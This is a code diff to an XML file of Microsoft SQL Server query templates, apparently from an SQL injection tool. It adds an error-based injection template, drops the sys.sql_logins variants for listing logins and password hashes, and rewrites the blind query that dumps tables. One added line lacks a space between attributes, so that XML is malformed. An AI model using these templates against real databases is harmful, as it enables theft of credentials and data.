@@ -450,18 +450,19 @@
         <timedelay query="WAITFOR DELAY '0:0:%d'"/>
         <substring query="SUBSTRING((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
+        <error query="%s %s=CONVERT(INT,(%s+(%s)+%s))"/>
         <inference query="AND ASCII(SUBSTRING((%s), %d, 1)) > %d"/>
         <banner query="SELECT @@VERSION"/>
         <current_user query="SELECT SUSER_NAME()"/>
         <current_db query="SELECT DB_NAME()"/>
         <is_dba query="PATINDEX('%sa_role%', SHOW_ROLE())>0"/>
         <users>
-            <inband query="SELECT name FROM master..syslogins ORDER BY 1" query2="SELECT name FROM sys.sql_logins ORDER BY 1"/>
-            <blind query="SELECT TOP 1 name FROM master..syslogins WHERE name NOT IN (SELECT TOP %d name FROM master..syslogins)" query2="SELECT TOP 1 name FROM sys.sql_logins WHERE name NOT IN (SELECT TOP %d name FROM sys.sql_logins)" count="SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins" count2="SELECT LTRIM(STR(COUNT(name))) FROM sys.sql_logins"/>
+            <inband query="SELECT name FROM master..syslogins ORDER BY 1"/>
+            <blind query="SELECT TOP 1 name FROM master..syslogins WHERE name NOT IN (SELECT TOP %d name FROM master..syslogins)"count="SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins"/>
         </users>
         <passwords>
-            <inband query="SELECT name, password FROM master..syslogins" query2="SELECT name, password_hash FROM sys.sql_logins" condition="name"/>
-            <blind query="SELECT TOP 1 password FROM master..syslogins WHERE name='%s' AND name NOT IN (SELECT TOP %d name FROM master..syslogins WHERE name='%s')" query2="SELECT TOP 1 password_hash FROM sys.sql_logins WHERE name='%s' AND name NOT IN (SELECT TOP %d name FROM sys.sql_logins WHERE name='%s')" count="SELECT LTRIM(STR(COUNT(password))) FROM master..syslogins WHERE name='%s'" count2="SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='%s'"/>
+            <inband query="SELECT name, password FROM master..syslogins" condition="name"/>
+            <blind query="SELECT TOP 1 password FROM master..syslogins WHERE name='%s' AND name NOT IN (SELECT TOP %d name FROM master..syslogins WHERE name='%s')" count="SELECT LTRIM(STR(COUNT(password))) FROM master..syslogins WHERE name='%s'"/>
         </passwords>
         <privileges/>
         <roles/>
@@ -479,7 +480,7 @@
         </columns>
         <dump_table>
             <inband query="SELECT %s FROM %s..%s"/>
-            <blind query="SELECT TOP 1 %s FROM %s..%s WHERE %s NOT IN (SELECT TOP %d %s FROM %s..%s)" count="SELECT LTRIM(STR(COUNT(*))) FROM %s..%s"/>
+            <blind query="SELECT TOP 1 %s FROM (SELECT TOP 1 * FROM ( SELECT TOP %d * FROM %s..%s ORDER BY %s ASC ) AS t1 ORDER BY %s DESC) AS t2 ORDER BY %s ASC" count="SELECT LTRIM(STR(COUNT(*))) FROM %s..%s"/>
         </dump_table>
         <search_db>
             <inband query="SELECT name FROM master..sysdatabases WHERE " condition="name"/>
